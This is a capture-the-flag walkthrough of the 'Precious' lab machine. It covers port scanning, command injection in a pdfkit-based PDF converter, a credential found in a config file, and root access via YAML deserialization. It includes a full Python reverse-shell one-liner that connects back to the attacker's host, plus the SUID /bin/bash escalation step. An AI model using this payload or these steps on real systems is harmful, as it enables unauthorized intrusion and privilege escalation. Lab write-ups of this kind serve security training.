## PRECIOUS (Easy)

### Enumeration
#### Port Recon
Nmap quick scan. 
`nmap TragetIP`

![quickscan](https://user-images.githubusercontent.com/115337317/213096376-0ff4daa1-1c20-458d-b4af-fc72dec88e8e.png)

Lets enumerate more about these ports. `nmap -sV -sC TragetIP -p22,80`

![svscscan](https://user-images.githubusercontent.com/115337317/213096549-b39319f0-11cd-4b65-97c4-d3b4cb48c9e1.png)

So, now we know that a nginx server is running on port 80 and ssh on 22. But before checking the website we can see in our scan when its scanning port 80 it unable to follow the redirect  which means we need to add "precious.htb" in our /etc/hosts file. 
`sudo nano /etc/hosts`

![image](https://user-images.githubusercontent.com/115337317/213097528-ac7c4243-18f1-41ca-95cd-40e719729d5f.png)

Like this. Now can we access target url 'http://precious.htb'.

![sitess](https://user-images.githubusercontent.com/115337317/213097741-d46e52ec-488f-4281-ac35-e098f8b3d0a6.png)

web page look like this. first thing whenever we are working with web application which we need to explore the application first before running attacks or anything because its give us a idea how that application works and which type of attack I can use.

By Exploring the web application I get to know that this application takes a url and convert that site into pdf but It will not take any random website from internet so I tried I setup a local website using python simple server using this command `python -m http.server 8000`. This command setup a simple python development server in our cureent directory.

![startserver](https://user-images.githubusercontent.com/115337317/213098908-f232ba54-cf56-4ecb-b901-8f9ed832f290.png)

When I tried this it successfully converted that webapge into pdf.

![webpdf](https://user-images.githubusercontent.com/115337317/213099516-10390aa5-05f9-4fc4-b268-828d3fabcb7e.png)

Now, we explored the website so we know that this is a simple web app which converts webpages into pdf.

#### Web recon
I tried to run few attacks like directory enumeration and all but find nothing in them. Their is no interseting file and page on the web.

** After trying diffrent attacks I decided to enumerate the pdf file which webapp is converting.
#### Analyzing pdf file
I am using exiftool to see but there are more tools like this to check metadata of file. `exiftool filename` 

![pdfaly](https://user-images.githubusercontent.com/115337317/213100415-25078f33-68aa-4a6b-9956-eaf2cfe7d24d.png)

So we can see this file is converted by pdfkit v0.8.6. After doing simple search like `pdfkit v0.8.6 exploits` on google I found that this version of pdfkit is vulnerable to os injection (CVE-2022-25765).  source:https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795


Now we know how to exploit this machine so get a revshell using netcat payload.set up a listner using `nc -lvp 8888`

![tryingpayload](https://user-images.githubusercontent.com/115337317/213106034-c0fd08f9-24eb-41c5-9539-12708ebff1b0.png)

Payload : `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Your IP",your PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'` 

URL: "your-python-server/?name=%20`Payload`"

After sumbmitting the url we get our reverse shell successfully.

![getingrevshell](https://user-images.githubusercontent.com/115337317/213106366-0df4441f-b9a0-448b-9178-e11554896fe3.png)

Now stablize the shell.Steps to stabilize shell.

![stablizeshel](https://user-images.githubusercontent.com/115337317/213108113-48e4a230-1c99-430a-8dad-0d97221a5d59.png)


Perform some basic enumeration first like checking `whoami` and checking the user directory to find something uesful.
I also performed these steps. We get reverse shell as user ruby and on checking the home directory I find there are two users henry and ruby after checking there directories we find that user.txt in henry's dir. Now we need to be henry  to read the file. But while enumerating ruby dir I found an ineterseting folder called ".bundle" in which there's a file named config in that file we have password of henry. 

![henrycred](https://user-images.githubusercontent.com/115337317/213107643-498a7701-0d65-4f88-8330-97390dd03fee.png)

try to login switch user `sudo su henry` put password. We got our first flag.

![usertxt](https://user-images.githubusercontent.com/115337317/213109137-549e0cba-910a-4fbe-8070-86df1cb259ee.png)

Now we need to escalate our privilages to read root.txt.
### Privilage escalation

First we check that do we have any file to run as root. using `sudo -l` we got that

![sudol](https://user-images.githubusercontent.com/115337317/213109643-18c3a270-e85b-49a3-a60d-1e6ae8baf894.png)

checking the file /opt/update_dependencies.sh. this file loading a file from henry's home dir denpendencies.yml

![updatedep](https://user-images.githubusercontent.com/115337317/213109901-478d8e9c-c87b-438f-b424-5fdc50bcafa1.png)

Looking over the code, we see that it uses YAML.load, which is vulnerable to deserialization attack. You can read more about YAML deserialization attacks here: github.com/DevComputaria/KnowledgeBase/blob.
In order for our remote code execution to work, we will need to craft a payload inside a yml file called dependencies.yml. Using the above link, I created the file below on the server, changing the git_set to id:


Reading dependencies.yml file.

![chekcingdepfile](https://user-images.githubusercontent.com/115337317/213110689-36d2b2ae-150f-418e-8d5e-932e6345d382.png)

Let's run the file and see how it works.

![runningthefile](https://user-images.githubusercontent.com/115337317/213111201-ae9e20f9-b60d-40ef-afa9-06ccb92174c2.png)

Our remote code execution worked! Now let’s see if we can change the permissions of the /bin/bash directory so that we can elevate our privileges. Edit your update_dependencies.rb file to change permissions of /bin/bash.

![runingfileagain](https://user-images.githubusercontent.com/115337317/213111372-047cab52-cc0e-4f9c-9d08-17d67057691b.png)

It run successfully.Run a simple command `/bin/bash -p` to root shell.

![gotrootshell](https://user-images.githubusercontent.com/115337317/213111561-510e7052-16ec-4b0c-b868-a070c25dbbfa.png)

Get our final flag root.txt.

![rootxt](https://user-images.githubusercontent.com/115337317/213111587-d64ec72b-03b0-4515-8b2d-4b569e11927d.png)



Keep working hard on your skill. :)
